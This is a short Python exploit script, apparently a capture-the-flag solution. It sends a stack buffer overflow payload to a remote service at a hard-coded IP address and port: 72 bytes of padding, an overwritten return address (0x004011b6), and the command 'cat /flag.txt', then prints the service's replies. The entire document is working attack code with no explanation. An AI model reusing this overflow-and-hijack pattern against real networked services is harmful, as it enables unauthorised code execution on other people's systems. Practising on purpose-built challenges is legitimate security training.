import socket, struct

offset = 72
new_eip= struct.pack("<I", 0x004011b6)

payload = b"".join([
    b"A" * offset,
    new_eip,
    b"cat /flag.txt"
])

payload += b"\n"

with socket.socket() as connection:
    connection.connect(("213.35.127.78", 13402))
    print(connection.recv(4096).decode('utf-8'))
    print(connection.recv(4096).decode('utf-8'))
    print("Now input:", payload)
    connection.send(payload)
    print(connection.recv(4096))
